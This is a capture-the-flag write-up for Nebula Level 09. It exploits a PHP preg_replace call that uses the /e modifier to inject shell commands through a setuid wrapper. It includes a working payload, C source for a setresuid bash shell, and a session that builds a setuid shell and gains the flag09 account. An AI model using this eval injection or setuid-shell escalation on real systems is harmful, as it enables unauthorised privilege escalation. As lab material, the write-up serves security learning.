**Intro**

Moving into some PHP with Level 09 we are given a script with a questionable function

```
function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}
```

This function takes two arguments
- `$filename` : used directly in the function
- `$use_me` : appears to be an unused argument

Further research also reveals that the first `preg_replace` uses the `/e` eval switch, which has been [deprecated due to severe security concerns](http://us3.php.net/manual/en/function.preg-replace.php). 

An initial input file to test contains the simple string that the replace is searching for

**/tmp/mail**

```
﻿[email user@foo.bar]
```

**Example**

```
﻿level09@nebula:/home/flag09$ ./flag09 /tmp/mail abuseThisArgument
user AT foo dot bar
```


The trick being, how to get the script to give us a shell.  This is where we can take advantage of the `$use_me` argument.

By changing the content of the file, as show, the `preg_replace` will evaluate the second argument 

```
﻿[email ${`$use_me`}]
```

First, I'll use a shellcode similar to that I've used in previous lessons, except modified so that uid can be passed as an argument and removing the need to hardcode it in each iteration.

**Source: shell.c**

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main (int argc, char *argv[])
{
	if (argc != 2)
		printf("usage %s <User ID>\n", argv[0]);
	else {
	int i = atoi(argv[1]);
	setresuid(i, i, i);
	system("/bin/bash");
	}
	return 0;
}
```

**Exploiting PHP**

```
level09@nebula:/home/flag09$ grep flag09 /etc/passwd
flag09:x:990:990::/home/flag09:/bin/sh

level09@nebula:/home/flag09$ ./flag09 /tmp/mail "/usr/bin/cc -o /home/flag09/shell /tmp/shell.c && chmod 4777 /home/flag09/shell"
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1

level09@nebula:/home/flag09$ ls -la
total 21
drwxr-x--- 1 flag09 level09   60 2016-10-14 18:50 .
drwxr-xr-x 1 root   root     380 2012-08-27 07:18 ..
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
-rwsrwxrwx 1 flag09 level09 7277 2016-10-14 18:50 shell

level09@nebula:/home/flag09$ ./shell 990
flag09@nebula:/home/flag09$ getflag
You have successfully executed getflag on a target account
```


**Additional References**

[Exploitable Functions](http://stackoverflow.com/questions/3115559/exploitable-php-functions)

[V0id S3curity extended solutions](http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-php-pregreplace.html)